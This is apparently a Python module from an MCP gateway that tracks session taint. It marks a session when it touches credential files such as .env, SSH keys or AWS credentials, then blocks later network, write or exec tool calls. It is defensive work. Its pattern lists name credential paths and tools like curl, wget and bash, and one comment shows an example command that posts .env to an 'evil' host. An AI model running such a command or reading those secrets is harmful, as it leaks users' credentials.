"""Phase 4: Stateful Session Taint Tracking for mcp-gw.

Implements fail-closed, monotonic information-flow taint tracking across an MCP
session. Reading sensitive sources (e.g., `.env`, `~/.ssh/*`, cloud credentials,
or responses flagged by DLP) immediately taints the session on request dispatch
(eliminating async pipelining races) and blocks subsequent outbound network,
write, execution, or unclassified (fail-closed) sink tool calls.

Security invariants:
- Never writes to stdout (stdout is reserved strictly for the JSON-RPC wire).
- Canonicalizes all candidate paths with `Path.resolve()` and inspects symlink
  targets before boundary/pattern checks.
- Fails closed on malformed paths (null bytes), excessive JSON nesting/node
  counts, single-shot sensitive-source + sink calls, and unknown tools once
  tainted.
- Taint is strictly monotonic within a session; no MCP tool call can clear it.
"""

from __future__ import annotations

import fnmatch
import logging
import os
import re
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Mapping
from urllib.parse import unquote, urlparse

# Never attach a stdout handler; callers configure stderr/file logging if needed.
logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())


class TaintLevel(str, Enum):
    """Monotonic taint state of an MCP session."""

    CLEAN = "clean"
    TAINTED = "tainted"


class TaintSeverity(str, Enum):
    """Severity classification of a taint source event."""

    HIGH = "high"
    CRITICAL = "critical"


class ToolCategory(str, Enum):
    """Security capability classification for MCP tools."""

    SAFE_READ = "safe_read"
    SENSITIVE_SOURCE = "sensitive_source"
    NETWORK_SINK = "network_sink"
    WRITE_SINK = "write_sink"
    EXEC_SINK = "exec_sink"
    UNKNOWN = "unknown"


class TaintDecisionAction(str, Enum):
    """Enforcement action returned by the taint engine."""

    ALLOW = "allow"
    ALLOW_AND_TAINT = "allow_and_taint"
    BLOCK = "block"


class MalformedPathError(ValueError):
    """Raised when a path candidate contains illegal characters (e.g. NUL)."""


class ArgumentInspectionLimitError(ValueError):
    """Raised when tool arguments exceed depth, node, or string size budgets."""


@dataclass(frozen=True, slots=True)
class TaintRecord:
    """Immutable provenance record describing why a session became tainted.

    Note: Never store raw secret contents in `source_detail` — only canonical
    paths, rule IDs, or safe metadata suitable for `logs/audit.jsonl`.
    """

    session_id: str
    timestamp_ns: int
    reason: str
    rule_id: str
    severity: TaintSeverity
    tool_name: str
    source_detail: str
    request_id: str | int | None = None
    method: str = "tools/call"

    def to_audit_dict(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "timestamp_ns": self.timestamp_ns,
            "reason": self.reason,
            "rule_id": self.rule_id,
            "severity": self.severity.value,
            "tool_name": self.tool_name,
            "source_detail": self.source_detail,
            "request_id": self.request_id,
            "method": self.method,
        }


@dataclass(frozen=True, slots=True)
class TaintDecision:
    """Result of evaluating an MCP request against session taint state."""

    action: TaintDecisionAction
    allowed: bool
    session_tainted: bool
    newly_tainted: bool
    tool_category: ToolCategory
    reason: str
    rule_id: str | None = None
    provenance: tuple[TaintRecord, ...] = ()

    def to_audit_dict(self) -> dict[str, Any]:
        return {
            "action": self.action.value,
            "allowed": self.allowed,
            "session_tainted": self.session_tainted,
            "newly_tainted": self.newly_tainted,
            "tool_category": self.tool_category.value,
            "reason": self.reason,
            "rule_id": self.rule_id,
            "provenance": [rec.to_audit_dict() for rec in self.provenance],
        }


@dataclass(frozen=True, slots=True)
class _SensitiveMatch:
    rule_id: str
    reason: str
    severity: TaintSeverity
    source_detail: str


DEFAULT_SENSITIVE_FILENAMES: tuple[str, ...] = (
    ".env",
    ".env.*",
    "*.env",
    "id_rsa",
    "id_rsa.*",
    "id_ed25519",
    "id_ed25519.*",
    "id_ecdsa",
    "id_dsa",
    "authorized_keys",
    "known_hosts",
    ".netrc",
    ".npmrc",
    ".pypirc",
    ".git-credentials",
    ".pgpass",
    "credentials",
    "credentials.json",
    "service-account*.json",
    "secrets.yaml",
    "secrets.yml",
    "secrets.json",
    "master.key",
    "*.pem",
    "*.key",
    "*.p12",
    "*.pfx",
    "*.kdbx",
    "shadow",
)

DEFAULT_SENSITIVE_DIRECTORIES: tuple[str, ...] = (
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    "~/.kube",
    "~/.config/gcloud",
    "~/.azure",
    "~/.docker",
    "/proc/self",
)

DEFAULT_SAFE_READ_TOOLS: frozenset[str] = frozenset(
    {
        "read_file",
        "fs_read_file",
        "fs.read_file",
        "read_multiple_files",
        "list_directory",
        "list_dir",
        "fs.list_dir",
        "search_files",
        "grep_files",
        "get_file_info",
        "stat_file",
        "directory_tree",
        "resources/read",
    }
)

DEFAULT_NETWORK_SINK_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"(?:^|[._\-/])(?:http|https|fetch|curl|wget|request|webhook|post|put|"
        r"upload|send|email|mail|smtp|slack|discord|teams|notify|socket|dns|"
        r"graphql|rpc|api_call|git_push|push|publish|exfil|remote|sync)(?:$|[._\-/])",
        re.IGNORECASE,
    ),
)

DEFAULT_WRITE_SINK_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"(?:^|[._\-/])(?:write|append|create_file|edit|patch|modify|save|"
        r"delete|remove|unlink|rename|move|copy|cp|mv|chmod|chown|mkdir|"
        r"put_object|insert|update|upsert|drop|truncate|commit)(?:$|[._\-/])",
        re.IGNORECASE,
    ),
)

DEFAULT_EXEC_SINK_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"(?:^|[._\-/])(?:exec|execute|shell|bash|sh|zsh|cmd|powershell|"
        r"run_command|run_script|spawn|subprocess|eval|terminal|pty|system)(?:$|[._\-/])",
        re.IGNORECASE,
    ),
)

DEFAULT_INLINE_SENSITIVE_PATTERNS: tuple[tuple[str, re.Pattern[str], TaintSeverity], ...] = (
    (
        "taint.inline.env_file",
        re.compile(r"(?:^|[\s'\"=@:/\\])\.env(?:\.[A-Za-z0-9_.\-]+)?(?:$|[\s'\"&;|>])"),
        TaintSeverity.CRITICAL,
    ),
    (
        "taint.inline.ssh_dir",
        re.compile(r"(?:~|/home/[^/\s]+|/root|/Users/[^/\s]+)?/\.ssh(?:/|$|[\s'\"])"),
        TaintSeverity.CRITICAL,
    ),
    (
        "taint.inline.aws_creds",
        re.compile(r"(?:~|/home/[^/\s]+|/root|/Users/[^/\s]+)?/\.aws/credentials\b"),
        TaintSeverity.CRITICAL,
    ),
    (
        "taint.inline.proc_environ",
        re.compile(r"/proc/(?:self|\d+)/environ\b"),
        TaintSeverity.CRITICAL,
    ),
    (
        "taint.inline.etc_shadow",
        re.compile(r"/etc/shadow\b"),
        TaintSeverity.CRITICAL,
    ),
    (
        "taint.inline.private_key_name",
        re.compile(r"\b(?:id_rsa|id_ed25519|id_ecdsa|id_dsa)\b"),
        TaintSeverity.CRITICAL,
    ),
)


@dataclass(frozen=True)
class TaintPolicyConfig:
    """Configuration for the Phase 4 session taint tracker."""

    workspace_root: Path = field(default_factory=Path.cwd)
    sensitive_filenames: tuple[str, ...] = DEFAULT_SENSITIVE_FILENAMES
    sensitive_directories: tuple[str, ...] = DEFAULT_SENSITIVE_DIRECTORIES
    explicit_tool_categories: Mapping[str, ToolCategory] = field(default_factory=dict)
    safe_read_tools: frozenset[str] = DEFAULT_SAFE_READ_TOOLS
    network_sink_patterns: tuple[re.Pattern[str], ...] = DEFAULT_NETWORK_SINK_PATTERNS
    write_sink_patterns: tuple[re.Pattern[str], ...] = DEFAULT_WRITE_SINK_PATTERNS
    exec_sink_patterns: tuple[re.Pattern[str], ...] = DEFAULT_EXEC_SINK_PATTERNS
    inline_sensitive_patterns: tuple[
        tuple[str, re.Pattern[str], TaintSeverity], ...
    ] = DEFAULT_INLINE_SENSITIVE_PATTERNS
    block_unknown_tools_when_tainted: bool = True
    block_exec_when_tainted: bool = True
    block_single_shot_sink_on_sensitive_arg: bool = True
    max_arg_nodes: int = 2048
    max_arg_depth: int = 16
    max_string_length: int = 65536
    max_records_per_session: int = 64

    def resolved_sensitive_dirs(self) -> tuple[Path, ...]:
        """Return canonicalized sensitive directory roots."""
        resolved: list[Path] = []
        for raw in self.sensitive_directories:
            expanded = os.path.expanduser(raw)
            try:
                resolved.append(Path(expanded).resolve(strict=False))
            except OSError:
                # Fall back to normalized absolute path if resolution fails.
                resolved.append(Path(os.path.normpath(os.path.abspath(expanded))))
        return tuple(resolved)


def canonicalize_candidate_path(
    raw_value: str,
    *,
    workspace_root: Path | None = None,
) -> tuple[Path, Path | None]:
    """Canonicalize a path or `file://` URI using `Path.resolve()`.

    Returns `(canonical_path, raw_symlink_target_or_none)`:
    - Rejects NUL bytes and ASCII control characters via `MalformedPathError`.
    - Decodes `file://` URIs and expands `~`.
    - Resolves relative paths against `workspace_root` (default `Path.cwd()`).
    - Uses `Path.resolve(strict=False)` to eliminate `..`, `.`, and symlinks.
    - Also inspects `os.readlink` when the leaf is a symlink (including dangling
      symlinks) so symlink-to-sensitive-target probes are always caught.
    """
    if "\x00" in raw_value:
        raise MalformedPathError("Path contains illegal NUL byte")
    if any(ord(ch) < 32 and ch not in ("\t",) for ch in raw_value):
        raise MalformedPathError("Path contains illegal control character")

    cleaned = raw_value.strip().strip("'\"")
    if cleaned.lower().startswith("file://"):
        parsed = urlparse(cleaned)
        # Reject remote UNC/non-local file hosts (e.g., file://evil.com/share)
        if parsed.netloc and parsed.netloc not in ("localhost", "127.0.0.1"):
            raise MalformedPathError(f"Non-local file URI host rejected: {parsed.netloc}")
        cleaned = unquote(parsed.path)
        if "\x00" in cleaned:
            raise MalformedPathError("Decoded file URI contains illegal NUL byte")

    expanded = os.path.expanduser(cleaned)
    candidate = Path(expanded)
    base = (workspace_root or Path.cwd()).resolve(strict=False)
    if not candidate.is_absolute():
        candidate = base / candidate

    symlink_target: Path | None = None
    try:
        if candidate.is_symlink():
            raw_link = Path(os.readlink(candidate))
            if not raw_link.is_absolute():
                raw_link = candidate.parent / raw_link
            symlink_target = raw_link.resolve(strict=False)
    except OSError:
        symlink_target = None

    try:
        canonical = candidate.resolve(strict=False)
    except RuntimeError as exc:
        # Symlink loop (ELOOP) -> fail closed
        raise MalformedPathError(f"Symlink resolution loop detected: {exc}") from exc

    return canonical, symlink_target


def extract_string_leaves(
    payload: Any,
    *,
    max_nodes: int = 2048,
    max_depth: int = 16,
    max_string_length: int = 65536,
) -> list[tuple[str, str]]:
    """Iteratively extract `(json_path, value)` string leaves with strict DoS bounds."""
    leaves: list[tuple[str, str]] = []
    stack: list[tuple[str, Any, int]] = [("$", payload, 0)]
    visited_nodes = 0

    while stack:
        path, current, depth = stack.pop()
        visited_nodes += 1
        if visited_nodes > max_nodes:
            raise ArgumentInspectionLimitError(
                f"Tool arguments exceed maximum node budget ({max_nodes})"
            )
        if depth > max_depth:
            raise ArgumentInspectionLimitError(
                f"Tool arguments exceed maximum nesting depth ({max_depth})"
            )

        if isinstance(current, str):
            if len(current) > max_string_length:
                raise ArgumentInspectionLimitError(
                    f"String argument at {path} exceeds max length ({max_string_length})"
                )
            leaves.append((path, current))
        elif isinstance(current, Mapping):
            for key, value in current.items():
                key_str = str(key)
                if "\x00" in key_str:
                    raise MalformedPathError(f"Argument key at {path} contains NUL byte")
                stack.append((f"{path}.{key_str}", value, depth + 1))
        elif isinstance(current, (list, tuple)):
            for idx, item in enumerate(current):
                stack.append((f"{path}[{idx}]", item, depth + 1))

    return leaves


@dataclass
class SessionTaintState:
    """Mutable per-session taint state guarded by `SessionTaintTracker`'s lock."""

    session_id: str
    level: TaintLevel = TaintLevel.CLEAN
    records: list[TaintRecord] = field(default_factory=list)
    total_blocks: int = 0
    created_at_ns: int = field(default_factory=time.time_ns)
    tainted_at_ns: int | None = None

    @property
    def is_tainted(self) -> bool:
        return self.level is TaintLevel.TAINTED

    def snapshot(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "level": self.level.value,
            "is_tainted": self.is_tainted,
            "total_blocks": self.total_blocks,
            "created_at_ns": self.created_at_ns,
            "tainted_at_ns": self.tainted_at_ns,
            "record_count": len(self.records),
            "records": [r.to_audit_dict() for r in self.records],
        }


class SessionTaintTracker:
    """Thread-safe, fail-closed MCP session taint tracking engine."""

    def __init__(self, config: TaintPolicyConfig | None = None) -> None:
        self._config = config or TaintPolicyConfig()
        self._resolved_sensitive_dirs = self._config.resolved_sensitive_dirs()
        self._explicit_categories = {
            k.strip().lower(): v for k, v in self._config.explicit_tool_categories.items()
        }
        self._safe_read_tools = frozenset(
            t.strip().lower() for t in self._config.safe_read_tools
        )
        self._lock = threading.RLock()
        self._sessions: dict[str, SessionTaintState] = {}

    @property
    def config(self) -> TaintPolicyConfig:
        return self._config

    def _get_or_create_session(self, session_id: str) -> SessionTaintState:
        if not session_id or not isinstance(session_id, str):
            raise ValueError("session_id must be a non-empty string")
        state = self._sessions.get(session_id)
        if state is None:
            state = SessionTaintState(session_id=session_id)
            self._sessions[session_id] = state
        return state

    def is_tainted(self, session_id: str) -> bool:
        with self._lock:
            state = self._sessions.get(session_id)
            return state.is_tainted if state is not None else False

    def get_session_snapshot(self, session_id: str) -> dict[str, Any]:
        with self._lock:
            state = self._get_or_create_session(session_id)
            return state.snapshot()

    def reset_session(self, session_id: str) -> None:
        """Out-of-band operator reset (never exposed to MCP tool calls)."""
        with self._lock:
            self._sessions.pop(session_id, None)

    def classify_tool(self, tool_name: str) -> ToolCategory:
        """Classify an MCP tool name using explicit overrides then capability heuristics."""
        normalized = tool_name.strip().lower()
        if not normalized:
            return ToolCategory.UNKNOWN

        if normalized in self._explicit_categories:
            return self._explicit_categories[normalized]

        # Check highest-risk sinks before safe-read allowlist so misnamed tools fail closed.
        for pattern in self._config.exec_sink_patterns:
            if pattern.search(normalized):
                return ToolCategory.EXEC_SINK

        for pattern in self._config.network_sink_patterns:
            if pattern.search(normalized):
                return ToolCategory.NETWORK_SINK

        for pattern in self._config.write_sink_patterns:
            if pattern.search(normalized):
                return ToolCategory.WRITE_SINK

        if normalized in self._safe_read_tools:
            return ToolCategory.SAFE_READ

        return ToolCategory.UNKNOWN

    def _check_canonical_path_sensitivity(self, path: Path) -> _SensitiveMatch | None:
        """Check whether a canonicalized path falls under a sensitive directory or filename."""
        for sensitive_dir in self._resolved_sensitive_dirs:
            try:
                if path == sensitive_dir or path.is_relative_to(sensitive_dir):
                    return _SensitiveMatch(
                        rule_id="taint.path.sensitive_dir",
                        reason=f"Access to sensitive directory boundary: {sensitive_dir}",
                        severity=TaintSeverity.CRITICAL,
                        source_detail=str(path),
                    )
            except ValueError:
                continue

        name_lower = path.name.lower()
        for pattern in self._config.sensitive_filenames:
            if fnmatch.fnmatch(name_lower, pattern.lower()):
                return _SensitiveMatch(
                    rule_id="taint.path.sensitive_file",
                    reason=f"Access to sensitive file pattern '{pattern}'",
                    severity=TaintSeverity.CRITICAL,
                    source_detail=str(path),
                )

        # Also check path parts for hidden sensitive directories anywhere in a path
        # (e.g., mounted/copied `.ssh` or `.aws` folder inside a workspace).
        lower_parts = {part.lower() for part in path.parts}
        for sensitive_segment in (".ssh", ".aws", ".gnupg", ".kube"):
            if sensitive_segment in lower_parts:
                return _SensitiveMatch(
                    rule_id="taint.path.sensitive_segment",
                    reason=f"Path traverses sensitive directory segment '{sensitive_segment}'",
                    severity=TaintSeverity.CRITICAL,
                    source_detail=str(path),
                )

        return None

    def _inspect_string_for_sensitive_source(self, value: str) -> _SensitiveMatch | None:
        """Inspect a single string leaf for sensitive paths, URIs, symlinks, or inline refs."""
        if "\x00" in value:
            raise MalformedPathError("Argument string contains illegal NUL byte")

        stripped = value.strip()
        if not stripped:
            return None

        lower_stripped = stripped.lower()
        is_http_url = lower_stripped.startswith(("http://", "https://"))

        # 1. Any single-token non-HTTP string (including bare filenames like `notes.txt`
        #    that may be symlinks in workspace_root) is canonicalized via Path.resolve().
        has_whitespace = any(ch.isspace() for ch in stripped)
        if not has_whitespace and not is_http_url and len(stripped) <= 4096:
            canonical, symlink_target = canonicalize_candidate_path(
                stripped,
                workspace_root=self._config.workspace_root,
            )
            match = self._check_canonical_path_sensitivity(canonical)
            if match is not None:
                return match
            if symlink_target is not None:
                link_match = self._check_canonical_path_sensitivity(symlink_target)
                if link_match is not None:
                    return _SensitiveMatch(
                        rule_id="taint.path.symlink_target",
                        reason=f"Symlink resolves to sensitive target: {link_match.reason}",
                        severity=TaintSeverity.CRITICAL,
                        source_detail=str(symlink_target),
                    )

        # 2. Check shell/command/composite strings against inline sensitive regexes.
        for rule_id, regex, severity in self._config.inline_sensitive_patterns:
            if regex.search(stripped):
                return _SensitiveMatch(
                    rule_id=rule_id,
                    reason=f"Inline reference matched sensitive source rule '{rule_id}'",
                    severity=severity,
                    source_detail=f"inline:{rule_id}",
                )

        # 3. Inspect composite/shell tokens (e.g. `cat notes.txt` or `curl -d @notes.txt`).
        if has_whitespace or any(sep in stripped for sep in ("=", "@")):
            for token in re.split(r"[\s=@]+", stripped):
                token_clean = token.strip("'\"();|&<>")
                if (
                    not token_clean
                    or len(token_clean) > 4096
                    or token_clean.lower().startswith(("http://", "https://"))
                ):
                    continue
                if token_clean.startswith("-") and not token_clean.startswith(("--", "-/")):
                    continue
                canonical, symlink_target = canonicalize_candidate_path(
                    token_clean,
                    workspace_root=self._config.workspace_root,
                )
                match = self._check_canonical_path_sensitivity(canonical)
                if match is not None:
                    return match
                if symlink_target is not None:
                    link_match = self._check_canonical_path_sensitivity(symlink_target)
                    if link_match is not None:
                        return _SensitiveMatch(
                            rule_id="taint.path.symlink_target",
                            reason=f"Symlink resolves to sensitive target: {link_match.reason}",
                            severity=TaintSeverity.CRITICAL,
                            source_detail=str(symlink_target),
                        )

        return None

    def _record_taint_locked(
        self,
        state: SessionTaintState,
        *,
        tool_name: str,
        reason: str,
        rule_id: str,
        severity: TaintSeverity,
        source_detail: str,
        request_id: str | int | None,
        method: str,
    ) -> tuple[TaintRecord, bool]:
        now_ns = time.time_ns()
        was_clean = not state.is_tainted
        state.level = TaintLevel.TAINTED
        if state.tainted_at_ns is None:
            state.tainted_at_ns = now_ns

        record = TaintRecord(
            session_id=state.session_id,
            timestamp_ns=now_ns,
            reason=reason,
            rule_id=rule_id,
            severity=severity,
            tool_name=tool_name,
            source_detail=source_detail,
            request_id=request_id,
            method=method,
        )
        if len(state.records) < self._config.max_records_per_session:
            state.records.append(record)
        return record, was_clean

    def _is_blocked_when_tainted(self, category: ToolCategory) -> tuple[bool, str, str]:
        if category is ToolCategory.NETWORK_SINK:
            return (
                True,
                "taint.block.network_sink",
                "Blocked outbound network sink in tainted session",
            )
        if category is ToolCategory.WRITE_SINK:
            return (
                True,
                "taint.block.write_sink",
                "Blocked write/mutation sink in tainted session",
            )
        if category is ToolCategory.EXEC_SINK and self._config.block_exec_when_tainted:
            return (
                True,
                "taint.block.exec_sink",
                "Blocked command execution sink in tainted session",
            )
        if (
            category is ToolCategory.UNKNOWN
            and self._config.block_unknown_tools_when_tainted
        ):
            return (
                True,
                "taint.block.unknown_tool_fail_closed",
                "Fail-closed: blocked unclassified tool in tainted session",
            )
        return False, "", ""

    def evaluate_tool_call(
        self,
        session_id: str,
        tool_name: str,
        arguments: Mapping[str, Any] | None = None,
        *,
        request_id: str | int | None = None,
        method: str = "tools/call",
    ) -> TaintDecision:
        """Evaluate an inbound MCP `tools/call` against session taint policy.

        Optimistically taints the session on request dispatch (before forwarding
        to the upstream MCP server) to prevent async pipelining races.
        """
        category = self.classify_tool(tool_name)

        with self._lock:
            state = self._get_or_create_session(session_id)

            # 1. Inspect arguments with fail-closed DoS and path validation guards.
            sensitive_matches: list[_SensitiveMatch] = []
            try:
                leaves = extract_string_leaves(
                    arguments if arguments is not None else {},
                    max_nodes=self._config.max_arg_nodes,
                    max_depth=self._config.max_arg_depth,
                    max_string_length=self._config.max_string_length,
                )
                for _json_path, leaf_val in leaves:
                    match = self._inspect_string_for_sensitive_source(leaf_val)
                    if match is not None:
                        sensitive_matches.append(match)
            except (MalformedPathError, ArgumentInspectionLimitError) as exc:
                state.total_blocks += 1
                logger.warning(
                    "Fail-closed taint block on malformed/oversized args: session=%s tool=%s err=%s",
                    session_id,
                    tool_name,
                    exc,
                )
                return TaintDecision(
                    action=TaintDecisionAction.BLOCK,
                    allowed=False,
                    session_tainted=state.is_tainted,
                    newly_tainted=False,
                    tool_category=category,
                    reason=f"Fail-closed argument inspection error: {exc}",
                    rule_id="taint.block.fail_closed_inspection",
                    provenance=tuple(state.records),
                )

            if category is ToolCategory.SENSITIVE_SOURCE and not sensitive_matches:
                sensitive_matches.append(
                    _SensitiveMatch(
                        rule_id="taint.tool.explicit_sensitive_source",
                        reason=f"Tool '{tool_name}' is classified as a sensitive source",
                        severity=TaintSeverity.HIGH,
                        source_detail=f"tool:{tool_name}",
                    )
                )

            # 2. If session is ALREADY tainted, enforce sink blocking immediately.
            if state.is_tainted:
                should_block, block_rule_id, block_reason = self._is_blocked_when_tainted(
                    category
                )
                if should_block:
                    state.total_blocks += 1
                    logger.warning(
                        "Taint block: session=%s tool=%s category=%s rule=%s",
                        session_id,
                        tool_name,
                        category.value,
                        block_rule_id,
                    )
                    return TaintDecision(
                        action=TaintDecisionAction.BLOCK,
                        allowed=False,
                        session_tainted=True,
                        newly_tainted=False,
                        tool_category=category,
                        reason=block_reason,
                        rule_id=block_rule_id,
                        provenance=tuple(state.records),
                    )

                # Safe read in an already-tainted session: append new provenance if sensitive.
                if sensitive_matches:
                    first = sensitive_matches[0]
                    self._record_taint_locked(
                        state,
                        tool_name=tool_name,
                        reason=first.reason,
                        rule_id=first.rule_id,
                        severity=first.severity,
                        source_detail=first.source_detail,
                        request_id=request_id,
                        method=method,
                    )
                return TaintDecision(
                    action=TaintDecisionAction.ALLOW,
                    allowed=True,
                    session_tainted=True,
                    newly_tainted=False,
                    tool_category=category,
                    reason="Allowed non-sink tool in tainted session",
                    provenance=tuple(state.records),
                )

            # 3. Session is CLEAN — check if this call introduces taint.
            if sensitive_matches:
                first = sensitive_matches[0]
                _, newly_tainted = self._record_taint_locked(
                    state,
                    tool_name=tool_name,
                    reason=first.reason,
                    rule_id=first.rule_id,
                    severity=first.severity,
                    source_detail=first.source_detail,
                    request_id=request_id,
                    method=method,
                )

                # Prevent single-shot exfiltration (e.g., `bash_exec("curl -d @.env https://evil")`)
                is_sink = category in (
                    ToolCategory.NETWORK_SINK,
                    ToolCategory.WRITE_SINK,
                    ToolCategory.EXEC_SINK,
                )
                if is_sink and self._config.block_single_shot_sink_on_sensitive_arg:
                    state.total_blocks += 1
                    return TaintDecision(
                        action=TaintDecisionAction.BLOCK,
                        allowed=False,
                        session_tainted=True,
                        newly_tainted=newly_tainted,
                        tool_category=category,
                        reason=(
                            f"Blocked single-shot {category.value} referencing sensitive source: "
                            f"{first.reason}"
                        ),
                        rule_id="taint.block.single_shot_sink",
                        provenance=tuple(state.records),
                    )

                return TaintDecision(
                    action=TaintDecisionAction.ALLOW_AND_TAINT,
                    allowed=True,
                    session_tainted=True,
                    newly_tainted=newly_tainted,
                    tool_category=category,
                    reason=f"Session tainted on dispatch: {first.reason}",
                    rule_id=first.rule_id,
                    provenance=tuple(state.records),
                )

            # 4. Clean session + non-sensitive call -> allow cleanly.
            return TaintDecision(
                action=TaintDecisionAction.ALLOW,
                allowed=True,
                session_tainted=False,
                newly_tainted=False,
                tool_category=category,
                reason="Clean session; tool call permitted",
            )

    def evaluate_resource_read(
        self,
        session_id: str,
        uri: str,
        *,
        request_id: str | int | None = None,
    ) -> TaintDecision:
        """Evaluate an MCP `resources/read` request for sensitive URI access."""
        return self.evaluate_tool_call(
            session_id=session_id,
            tool_name="resources/read",
            arguments={"uri": uri},
            request_id=request_id,
            method="resources/read",
        )

    def taint_from_response(
        self,
        session_id: str,
        *,
        tool_name: str,
        reason: str,
        rule_id: str = "taint.response.dlp_secret",
        severity: TaintSeverity = TaintSeverity.CRITICAL,
        source_detail: str = "response_body_secret",
        request_id: str | int | None = None,
        method: str = "tools/call",
    ) -> TaintRecord:
        """Mark a session tainted when Phase 5 (`scanner.py`/`dlp.py`) detects
        secrets or sensitive material in an upstream tool response body.
        """
        with self._lock:
            state = self._get_or_create_session(session_id)
            record, _ = self._record_taint_locked(
                state,
                tool_name=tool_name,
                reason=reason,
                rule_id=rule_id,
                severity=severity,
                source_detail=source_detail,
                request_id=request_id,
                method=method,
            )
            logger.warning(
                "Session tainted from response scan: session=%s tool=%s rule=%s",
                session_id,
                tool_name,
                rule_id,
            )
            return record
